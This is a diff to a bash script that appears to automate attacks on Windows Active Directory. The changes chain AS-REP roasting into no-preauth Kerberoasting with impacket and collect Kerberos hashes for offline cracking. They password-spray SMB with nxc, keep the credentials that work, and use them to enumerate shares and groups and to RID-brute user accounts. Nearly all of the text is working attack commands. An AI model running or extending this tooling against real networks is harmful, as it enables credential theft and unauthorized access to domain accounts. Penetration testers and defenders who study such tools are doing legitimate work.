@@ -149,11 +149,15 @@ for port in $open_ports; do
             nmap $target -p"$port" --host-timeout 3s -T5 | grep -vE 'Nmap|latency|nmap' | sed '1d'
             if [ -s "$enumx_dir/domains" ]; then
                 for domain in $(cat "$enumx_dir/domains"); do
-                    PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes"
+                    hash=$(PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes")
+                    user=$(echo "$hash" | sed -E 's/([^$]*\$){3}([^@]*)@.*/\2/')
+                    PYTHONWARNINGS="ignore" impacket-GetUserSPNs -no-preauth "$user" -usersfile "$enumx_dir/usernames" -dc-host "$target" "$domain"/ | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes"
                 done
                 for domain in $(cat "$enumx_dir/domains"); do
                     for cred in $(cat "$enumx_dir/creds"); do
-                         PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes"
+                    	if [[ ! "$cred" =~ ^(:|[Gg]uest:)$ ]]; then
+	                        PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes"
+	                    fi
                     done
                 done
             fi
@@ -182,21 +186,21 @@ for port in $open_ports; do
           	if [ "$using_creds" == true ]; then
           		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success)
           		echo
-  		        echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
+          		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        echo
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 	           	for cred in $(cat "$enumx_dir"/creds); do
 	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
    		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
    		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
-   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute)
+   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                     list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
-                    echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"              
+                    echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
  	            	echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
  	                echo
- 	                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
+ 	                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | sed -E '1d'
  	                echo
- 	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
+ 	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
  	                echo
  	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
  	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
@@ -256,14 +260,14 @@ for port in $open_ports; do
           	if [ "$using_creds" == true ]; then
           		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success)
           		echo
-          		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | sed '/^[Gg]uest:$/d;/^:$/d' | tee -a "$enumx_dir/creds"
+          		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        echo
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 	           	for cred in $(cat "$enumx_dir"/creds); do
 	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
    		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
    		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
-   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute)
+   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                     list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                     echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
  	            	echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
